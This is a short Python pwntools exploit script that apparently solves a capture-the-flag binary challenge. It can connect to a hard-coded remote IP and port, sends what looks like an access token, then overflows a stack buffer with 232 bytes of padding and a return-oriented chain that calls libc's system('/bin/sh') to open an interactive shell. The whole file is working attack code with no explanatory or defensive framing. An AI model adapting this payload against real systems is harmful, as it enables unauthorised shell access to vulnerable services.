from pwn import *
def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """) 
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve(): 
    p = conn()

    if (args.REMOTE):
        p.sendline(b'13523148')
        p.sendline(bytes(args.BINARY, 'utf-8'))


    libc=ELF('libc.so.6')
    base_addr = 0x00007ffff7d90000
    bin_sh = base_addr + next(libc.search(b'/bin/sh'))
    sys = base_addr + libc.symbols['system']
    ret = 0x40101a
    poprdi = 0x40151a
    offset = 224+8

    payload = b'a'*offset + p64(ret) + p64(poprdi) + p64(bin_sh) + p64(sys)

    p.sendline(payload)

    p.interactive()

solve()